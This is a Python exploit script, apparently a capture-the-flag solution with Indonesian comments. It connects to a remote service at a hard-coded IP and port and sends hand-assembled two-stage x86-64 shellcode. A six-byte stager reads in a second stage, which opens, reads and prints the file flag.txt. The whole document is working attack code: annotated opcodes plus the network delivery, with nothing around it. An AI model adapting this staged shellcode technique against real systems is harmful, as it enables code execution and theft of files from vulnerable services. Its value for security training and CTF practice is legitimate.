import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "165.22.100.192"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31202

# --- stage 1 (6 byte) ---
# 50          push rax              ; rax = addr mmap RWX
# 5e          pop  rsi              ; rsi = sc
# 31 c0       xor  eax, eax         ; rax = 0 -> syscall read, dan rdx jadi 0x50fc0 (331KB)
# 0f 05       syscall               ; read(0, sc, rdx) -> baca stage2 gede, IP lanjut ke sc+6
stage1 = bytes([0x50, 0x5e, 0x31, 0xc0, 0x0f, 0x05])

# --- stage 2 (open/read/write flag.txt, posisi-independen) ---
stage2 = bytes.fromhex(
    "488d3d3c000000"  # lea rdi,[rip+0x3c]  -> "flag.txt"
    "31f6"            # xor esi,esi
    "31d2"            # xor edx,edx
    "b802000000"      # mov eax,2          ; open
    "0f05"            # syscall
    "89c7"            # mov edi,eax        ; fd
    "4881ec00020000"  # sub rsp,0x200
    "488d3424"        # lea rsi,[rsp]
    "ba00020000"      # mov edx,0x200
    "31c0"            # xor eax,eax        ; read
    "0f05"            # syscall
    "89c2"            # mov edx,eax        ; n
    "bf01000000"      # mov edi,1
    "488d3424"        # lea rsi,[rsp]
    "b801000000"      # mov eax,1          ; write
    "0f05"            # syscall
    "31ff"            # xor edi,edi
    "b83c000000"      # mov eax,60         ; exit
    "0f05"            # syscall
    "666c61672e74787400"  # "flag.txt\0"
)

# stage1 + 6 byte NOP (sc[6..] ketimpa stage2 sebelum stage1 selesai baca)
payload = stage1 + b"\x90" * 6 + stage2

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(8)
banner = s.recv(4096)
print(banner.decode(errors="replace"), end="")

s.sendall(payload)

out = b""
while True:
    try:
        c = s.recv(4096)
        if not c:
            break
        out += c
    except socket.timeout:
        break
print(out.decode(errors="replace"))
s.close()
